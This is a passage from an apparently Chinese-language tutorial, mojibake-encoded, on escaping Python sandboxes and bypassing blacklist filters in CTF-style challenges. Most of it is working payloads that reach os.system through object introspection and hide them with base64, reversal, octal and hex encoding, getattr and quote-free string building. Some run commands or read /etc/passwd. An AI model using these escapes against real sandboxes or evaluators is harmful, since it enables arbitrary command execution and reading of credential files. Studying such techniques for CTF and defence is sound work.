class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>][<span class="string">&#x27;fi&#x27;</span>+<span class="string">&#x27;le&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div><p>å±€é™æ€§ï¼šå¦‚æœè¿‡æ»¤çš„æ˜¯  <code>__class__</code>  æˆ–è€…  <code>__mro__</code>  è¿™æ ·çš„å±æ€§åï¼Œå°±æ— æ³•é‡‡ç”¨å˜å½¢æ¥ç»•è¿‡äº†ã€‚</p><h5 id="base64å˜å½¢"><a class="markdownIt-Anchor" href="#base64å˜å½¢">#</a> base64 å˜å½¢</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div><h5 id="é€†åº"><a class="markdownIt-Anchor" href="#é€†åº">#</a> é€†åº</h5><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br></pre></td></tr></table></figure></div><p>æ³¨æ„ exec ä¸ eval åœ¨æ‰§è¡Œä¸Šæœ‰æ‰€å·®å¼‚ã€‚</p><blockquote><p><code>eval</code>  å‡½æ•°ç”¨äºè®¡ç®—ä¼ é€’ç»™å®ƒçš„ Python è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›ç»“æœã€‚å®ƒé€šå¸¸ç”¨äº<strong>æ‰§è¡Œå•ä¸€è¡¨è¾¾å¼</strong>ï¼Œå¹¶å°†å…¶ç»“æœèµ‹å€¼ç»™å˜é‡ã€‚</p><p><code>exec</code>  å‡½æ•°ç”¨äºæ‰§è¡ŒåŒ…å« Python ä»£ç å—çš„å­—ç¬¦ä¸²ã€‚å®ƒé€šå¸¸ç”¨äº<strong>æ‰§è¡Œå¤šè¡Œä»£ç </strong>ï¼Œè€Œä¸è¿”å›ä»»ä½•ç»“æœã€‚</p></blockquote><h5 id="è¿›åˆ¶è½¬æ¢"><a class="markdownIt-Anchor" href="#è¿›åˆ¶è½¬æ¢">#</a> è¿›åˆ¶è½¬æ¢</h5><p>å…«è¿›åˆ¶ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div><p>åå…­è¿›åˆ¶ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>exp:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div><h5 id="å…¶ä»–ç¼–ç "><a class="markdownIt-Anchor" href="#å…¶ä»–ç¼–ç ">#</a> å…¶ä»–ç¼–ç </h5><p>hexã€rot13ã€base32 ç­‰ã€‚</p><h4 id="è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å">#</a> è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å</h4><p>åœ¨ payload çš„æ„é€ ä¸­ï¼Œæˆ‘ä»¬å¤§é‡çš„ä½¿ç”¨äº†å„ç§ç±»ä¸­çš„å±æ€§ï¼Œä¾‹å¦‚  <code>__class__</code> ã€ <code>__import__</code>  ç­‰ã€‚</p><h5 id="getattr-å‡½æ•°"><a class="markdownIt-Anchor" href="#getattr-å‡½æ•°">#</a> getattr å‡½æ•°</h5><p>getattr æ˜¯ python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•ï¼Œå…¶è¯­æ³•å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>,name[,default])</span><br></pre></td></tr></table></figure></div><p>è¿™é‡Œï¼Œobject æ˜¯å¯¹è±¡ï¼Œname æ˜¯å­—ç¬¦ä¸²ï¼Œä»£è¡¨è¦è·å–çš„å±æ€§çš„åç§°ã€‚å¦‚æœæä¾›äº† default å‚æ•°ï¼Œå½“å±æ€§ä¸å­˜åœ¨æ—¶ä¼šè¿”å›è¿™ä¸ªå€¼ï¼Œå¦åˆ™ä¼šæŠ›å‡º AttributeErrorã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·ä¸€æ¥ï¼Œå°±å¯ä»¥å°† payload ä¸­çš„å±æ€§åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„å˜æ¢æ–¹å¼å¤šç§å¤šæ ·ï¼Œæ›´æ˜“äºç»•è¿‡é»‘åå•ã€‚</p><h5 id="__getattribute__-å‡½æ•°"><a class="markdownIt-Anchor" href="#__getattribute__-å‡½æ•°">#</a>  <code>__getattribute__</code>  å‡½æ•°</h5><p><code>__getattribute__</code>  äºï¼Œå®ƒå®šä¹‰äº†å½“æˆ‘ä»¬å°è¯•è·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶åº”è¯¥è¿›è¡Œçš„æ“ä½œã€‚</p><p>å®ƒçš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, name</span>):</span><br></pre></td></tr></table></figure></div><p>getattr å‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„  <code>__getattribute__</code>  æ–¹æ³•ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br></pre></td></tr></table></figure></div><h5 id="__getattr__-å‡½æ•°"><a class="markdownIt-Anchor" href="#__getattr__-å‡½æ•°">#</a>  <code>__getattr__</code>  å‡½æ•°</h5><p><code>__getattr__</code>  æ˜¯ Python çš„ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œå½“å°è¯•è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œå®ƒå°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªå¯¹è±¡åŠ¨æ€åœ°è¿”å›ä¸€ä¸ªå±æ€§å€¼ï¼Œæˆ–è€…æŠ›å‡ºä¸€ä¸ª  <code>AttributeError</code>  å¼‚å¸¸ã€‚</p><p>å¦‚ä¸‹æ˜¯  <code>__getattr__</code>  æ–¹æ³•çš„åŸºæœ¬å½¢å¼ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure></div><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»»ä½•ä½ å°è¯•è®¿é—®çš„ä¸å­˜åœ¨çš„å±æ€§éƒ½ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½¢å¦‚ â€œYou tried to get Xâ€ï¼Œå…¶ä¸­ X æ˜¯ä½ å°è¯•è®¿é—®çš„å±æ€§åã€‚</p><p>ä¸  <code>__getattribute__</code>  ä¸åŒï¼Œ <code>__getattr__</code>  åªæœ‰åœ¨<strong>å±æ€§æŸ¥æ‰¾å¤±è´¥</strong>æ—¶æ‰ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä½¿å¾—  <code>__getattribute__</code>  å¯ä»¥ç”¨æ¥æ›´ä¸ºå…¨é¢åœ°æ§åˆ¶å±æ€§è®¿é—®ã€‚</p><p>å¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­åŒæ—¶å®šä¹‰äº†  <code>__getattr__</code>  å’Œ  <code>__getattribute__</code> ï¼Œé‚£ä¹ˆæ— è®ºå±æ€§æ˜¯å¦å­˜åœ¨ï¼Œ <code>__getattribute__</code>  éƒ½ä¼šè¢«é¦–å…ˆè°ƒç”¨ã€‚åªæœ‰å½“  <code>__getattribute__</code>  æŠ›å‡º  <code>AttributeError</code>  å¼‚å¸¸æ—¶ï¼Œ <code>__getattr__</code>  æ‰ä¼šè¢«è°ƒç”¨ã€‚</p><p>å¦å¤–ï¼Œæ‰€æœ‰çš„ç±»éƒ½ä¼šæœ‰ <code>__getattribute__</code> å±æ€§ï¼Œè€Œä¸ä¸€å®šæœ‰ <code>__getattr__</code> å±æ€§ã€‚</p><h5 id="__globals__-æ›¿æ¢"><a class="markdownIt-Anchor" href="#__globals__-æ›¿æ¢">#</a>  <code>__globals__</code>  æ›¿æ¢</h5><p><code>__globals__</code>  å¯ä»¥ç”¨ func_globals ç›´æ¥æ›¿æ¢ï¼›</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="__mro__-__bases__-__base__äº’æ¢"><a class="markdownIt-Anchor" href="#__mro__-__bases__-__base__äº’æ¢">#</a>  <code>__mro__</code> ã€ <code>__bases__</code> ã€ <code>__base__</code> äº’æ¢</h5><p>ä¸‰è€…ä¹‹é—´å¯ä»¥ç›¸äº’æ›¿æ¢</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤-import"><a class="markdownIt-Anchor" href="#è¿‡æ»¤-import">#</a> è¿‡æ»¤ import</h4><p>python ä¸­é™¤äº†å¯ä»¥ä½¿ç”¨ import æ¥å¯¼å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨  <code>__import__</code>  å’Œ  <code>importlib.import_module</code>  æ¥å¯¼å…¥æ¨¡å—</p><h5 id="__import__"><a class="markdownIt-Anchor" href="#__import__">#</a>  <code>__import__</code></h5><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h5 id="importlibimport_module"><a class="markdownIt-Anchor" href="#importlibimport_module">#</a> importlib.import_module</h5><p>ä¸è¿‡ importlib ä¹Ÿéœ€è¦å¯¼å…¥ï¼Œæ‰€ä»¥æœ‰äº›é¸¡è‚‹.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>æ³¨æ„ï¼šimportlib éœ€è¦è¿›è¡Œå¯¼å…¥ä¹‹åæ‰èƒ½å¤Ÿä½¿ç”¨</p><h5 id="__loader__load_module"><a class="markdownIt-Anchor" href="#__loader__load_module">#</a>  <code>__loader__.load_module</code></h5><p>å¦‚æœä½¿ç”¨ audithook çš„æ–¹å¼è¿›è¡Œè¿‡æ»¤ï¼Œä¸Šé¢çš„ä¸¤ç§æ–¹æ³•å°±æ— æ³•ä½¿ç”¨äº†ï¼Œä½†æ˜¯  <code>__loader__.load_module</code>  åº•å±‚å®ç°ä¸ import ä¸åŒï¼Œå› æ­¤æŸäº›æƒ…å†µä¸‹å¯ä»¥ç»•è¿‡.</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†">#</a> è¿‡æ»¤äº† []</h4><p>å¦‚æœä¸­æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ä¸¤ç§æ–¹å¼æ¥ç»•è¿‡ï¼š</p><ol><li>è°ƒç”¨ <code>__getitem__()</code>  å‡½æ•°ç›´æ¥æ›¿æ¢ï¼›#  <code>[x]</code>  &lt;=&gt;  <code>__getitem__(x)</code></li><li>è°ƒç”¨ pop () å‡½æ•°ï¼ˆç”¨äºç§»é™¤åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œé»˜è®¤æœ€åä¸€ä¸ªå…ƒç´ ï¼Œ<strong>å¹¶ä¸”è¿”å›è¯¥å…ƒç´ çš„å€¼</strong>ï¼‰æ›¿æ¢ï¼›</li></ol><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__()æ›¿æ¢ä¸­æ‹¬å·[]</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()æ›¿æ¢ä¸­æ‹¬å·[]ï¼Œç»“åˆ__getitem__()åˆ©ç”¨</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="è¿‡æ»¤äº†-2"><a class="markdownIt-Anchor" href="#è¿‡æ»¤äº†-2">#</a> è¿‡æ»¤äº† â€˜â€™</h4><h5 id="str-å‡½æ•°"><a class="markdownIt-Anchor" href="#str-å‡½æ•°">#</a> str å‡½æ•°</h5><p>å¦‚æœè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ payload ä¸­æ„é€ çš„å­—ç¬¦ä¸²ä¼šå—åˆ°å½±å“ã€‚å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ str () å‡½æ•°è·å–å­—ç¬¦ä¸²ï¼Œç„¶åç´¢å¼•åˆ°é¢„æœŸçš„å­—ç¬¦ã€‚å°†æ‰€æœ‰çš„å­—ç¬¦è¿æ¥èµ·æ¥å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„å­—ç¬¦ä¸²ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div><h5 id="chr-å‡½æ•°"><a class="markdownIt-Anchor" href="#chr-å‡½æ•°">#</a> chr å‡½æ•°</h5><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ chr åŠ æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure></div><h5 id="list-dict"><a class="markdownIt-Anchor" href="#list-dict">#</a> list + dict</h5><p>ä½¿ç”¨ dict å’Œ list è¿›è¡Œé…åˆå¯ä»¥å°†å˜é‡åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œä½†è¿™ç§æ–¹å¼çš„å¼Šç«¯åœ¨äºå­—ç¬¦ä¸²ä¸­ä¸èƒ½æœ‰ç©ºæ ¼ç­‰ã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] <span class="comment"># è¿”å›whoami</span></span><br></pre></td></tr></table></figure></div><h5 id="__doc__"><a class="markdownIt-Anchor" href="#__doc__">#</a>  <code>__doc__</code></h5><p><code>__doc__</code>  å˜é‡å¯ä»¥è·å–åˆ°ç±»çš„è¯´æ˜ä¿¡æ¯ï¼Œä»å…¶ä¸­ç´¢å¼•å‡ºæƒ³è¦çš„å­—ç¬¦ç„¶åè¿›è¡Œæ‹¼æ¥å°±å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br></pre></td></tr></table></figure></div><h5 id="bytes-å‡½æ•°"><a class="markdownIt-Anchor" href="#bytes-å‡½æ•°">#</a> bytes å‡½æ•°</h5><p>bytes å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ª ascii åˆ—è¡¨ï¼Œç„¶åè½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå†è°ƒç”¨ decode åˆ™å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span 